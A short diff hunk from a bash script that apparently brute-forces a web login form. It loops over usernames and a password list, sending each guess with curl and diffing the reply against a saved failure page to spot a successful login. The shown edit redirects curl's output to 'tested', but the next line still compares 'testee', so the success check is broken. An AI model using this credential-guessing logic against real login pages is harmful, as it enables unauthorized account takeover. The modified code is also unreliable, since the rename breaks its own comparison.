@@ -7,7 +7,7 @@ while IFS='' read -r user; do
 		url3="&Login=Login#"
 		while IFS='' read -r line; do
 				echo "try password: $line"
-				curl -s "$url1$user$url2$line$url3" > testee
+				curl -s "$url1$user$url2$line$url3" > tested
 				DIFF=$(diff trueone testee)
 				if [ "$DIFF" != "" ]
 				then
